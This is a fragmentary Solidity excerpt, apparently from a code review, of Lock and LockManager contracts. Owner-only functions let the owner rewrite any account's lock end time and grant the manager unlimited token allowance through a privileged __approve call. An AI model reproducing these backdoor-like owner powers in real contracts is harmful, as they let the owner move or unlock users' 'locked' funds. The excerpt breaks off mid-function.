...
contract Lock {
    ...
    function __changeLockEndTime(uint256 epochEnd) external onlyManager {
        properties.lockEnd = uint32(epochEnd);
    }
}
...
contract LockManager {
    ...
    function __changeLockEndTime(address account, uint256 epochEnd) external onlyOwner {
        Lock _contract = Lock(lockMap[account].lockAddress);
        lockMap[account].lockEnd = uint32(epochEnd);
        _contract.__changeLockEndTime(epochEnd);
    }

    function __setCurrentToken(address token) external onlyOwner {
        currentToken = IERC20(token);
        currentDecimals = currentToken.decimals();
        deployed _token = deployed(address(currentToken));
        _token.__approve(msg.sender, address(this), type(uint256).max);
    }

    function __balanceOfThis() external view returns (uint256) {
